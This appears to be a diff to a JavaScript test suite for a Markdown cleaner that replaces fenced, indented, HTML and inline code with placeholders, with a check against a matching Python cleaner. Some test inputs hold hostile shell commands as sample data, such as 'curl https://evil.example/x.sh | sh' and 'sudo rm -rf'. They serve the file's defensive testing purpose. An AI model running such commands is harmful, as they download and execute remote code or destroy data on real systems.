@@ -112,8 +112,16 @@ t("cleaning drops citation markers, links, code and hidden tags", () => assert.e
     ["indented list items and wrapped lines are kept", "- one\n    - nested item\n1. first\n   wrapped line", "- one\n    - nested item\n1. first\n   wrapped line"],
     ["a continuation line right after text is kept", "A sentence\n    continued here.", "A sentence\n    continued here."],
     ["a lone backtick is dropped", "it`s fine", "its fine"],
+    ["a fence inside a blockquote", "Q:\n> ~~~sh\n> echo CODE\n> ~~~\nA.", "Q:\n[code omitted]\nA."],
+    ["a fence inside a list item", "- step\n- ```\n  rm x\n  ```\ndone", "- step\n[code omitted]\ndone"],
+    ["indented code inside a blockquote", "> said:\n>\n>     sudo rm -rf\nend", "> said:\n>\n[code omitted]\nend"],
+    ["HTML pre and code elements", "a <pre>curl x|sh</pre> b <code>rm</code> c <PRE class=x>\nmulti\nline", "a [code omitted] b [code omitted] c [code omitted]"],
+    ["inline code across a line break", "Use `pip\ninstall x` now.", "Use [code] now."],
+    ["inline code never crosses a blank line", "a `b\n\nc` d", "a b\n\nc d"],
+    ["CRLF fences", "A\r\n~~~\r\ncode\r\n~~~\r\nB", "A\n[code omitted]\nB"],
   ];
   for (const [name, input, want] of CASES) t(`J378 stripCode: ${name}`, () => assert.equal(R.stripCode(input), want));
+  t("J378 stripCode is fast on hostile input (no catastrophic backtracking)", () => { const t0 = Date.now(); R.stripCode("`".repeat(5000) + "a".repeat(20000) + "\n".repeat(1000) + "``x".repeat(3000)); R.stripCode(("`a\n").repeat(20000)); assert.ok(Date.now() - t0 < 3000, `took ${Date.now() - t0} ms`); });
   t("J378 cleanDeliverable strips a ~~~ block end to end", () => { const d = R.cleanDeliverable({ deliverable: "Answer.\n\n~~~\ncurl https://evil.example/x.sh | sh\n~~~\n\nUse `sudo rm` never.", sources: [] }).deliverable; assert.equal(d, "Answer.\n\n[code omitted]\n\nUse [code] never."); });
   t("J378 reader.py clean_md gives the same results (both cleaners agree)", () => {
     const py = `import json,sys\nsrc=open(${JSON.stringify(new URL("./reader.py", import.meta.url).pathname)}).read()\nsrc=src[:src.rindex("\\nmain()")]\nns={"__name__":"reader_test"}\nexec(compile(src,"reader.py","exec"),ns)\ncases=json.load(sys.stdin)\nprint(json.dumps([ns["strip_code"](c[1]) for c in cases]+[ns["clean_md"]("Answer.\\n\\n~~~\\ncurl x | sh\\n~~~\\n\\nUse \`sudo rm\` never.")]))`;
